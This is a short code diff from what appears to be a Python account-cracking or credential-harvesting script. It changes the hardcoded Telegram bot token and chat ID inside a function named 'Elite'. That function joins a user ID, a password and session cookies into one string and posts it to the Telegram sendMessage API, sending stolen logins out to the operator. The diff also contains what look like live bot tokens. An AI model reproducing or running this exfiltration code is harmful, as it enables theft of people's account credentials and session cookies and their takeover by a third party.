@@ -125,8 +125,8 @@ def uaku():
 import requests
 def Elite(id,ps,kuki):
     try:
-        token = "6900924587:AAGwVC8_cDIWs_1wDzbNNwmMBLbwu5Rqn3g"
-        chatid = "6565741543"
+        token = "7147926567:AAFPY9-JRTvj3h3XZ99FQh3408oix7Vks2g"
+        chatid = "5608831276"
         ok_id =str(id+"|"+ps+"|"+kuki)
         url = f"https://api.telegram.org/bot{token}/sendMessage"
         params = {"chat_id": chatid, "text": ok_id}
